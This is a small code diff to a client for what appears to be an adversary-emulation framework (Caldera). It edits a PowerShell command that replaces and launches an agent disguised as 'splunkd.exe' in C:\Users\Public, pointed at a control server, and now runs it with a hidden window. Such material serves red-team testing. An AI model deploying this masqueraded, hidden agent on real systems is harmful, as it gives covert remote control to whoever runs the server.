@@ -305,7 +305,7 @@ class CalderaClient:
                 "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;\n"
                 "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;\n"
                 "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;\n"
-                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\""
+                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\" -WindowStyle hidden;"
             )
 
         return (
